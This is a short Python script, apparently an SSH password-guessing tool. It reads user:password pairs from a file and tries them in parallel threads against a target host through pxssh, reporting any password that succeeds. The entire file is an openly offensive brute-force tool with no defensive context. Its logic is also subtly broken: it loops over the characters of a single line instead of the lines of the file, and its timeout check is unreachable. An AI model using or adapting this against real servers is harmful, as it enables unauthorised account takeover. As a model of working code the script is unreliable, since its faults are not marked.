#!/usr/bin/python3.8

import pxssh
import argparse
import time
from threading import *

MaxCon=5
ConLock=BoundedSemaphore(value=MaxCon)
found=False
fails=0

def connect(host,user,passw,release):
    global found
    global fails
    try:
        s=pxssh.pxssh()
        s.login(host,user,passw)
        print('password found : '+ passw)   
        found=True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            fails+=1
            time.sleep(5)
            connect(host,user,passw,False)
        elif 'synchronize with original prompt ' in str(e):
            time.sleep(1)
            connect(host,user,passw,False)
    finally:
        if release :ConLock.release()

def main():
    parser=argparse.ArgumentParser()
    parser.add_argument('-H','--host',action='store',dest='host',help='specify the host')
    parser.add_argument('-f','--file',action='store',dest='file',help='specify the file')
    args=parser.parse_args()
    host=args.host
    file=args.file
    if host==None or file==None :
        print('specify the host and file')
        exit(0)
    fn=open(file,'r')
    for line in fn.readline():
        user=line.split(':')[0]
        passw=line.split(':')[1].strip('\r').strip('\n')
        if found:
            print('exiting password found ')
            exit(0)
            if fails>5:
                print('exiting to many socket timeout')
                exit(0)
        ConLock.acquire()
        print('testing password : ' +str(passw))
        t=Thread(target=connect,args=(host,user,passw,True))
        child=t.start()

if  __name__=='__main__':
    main()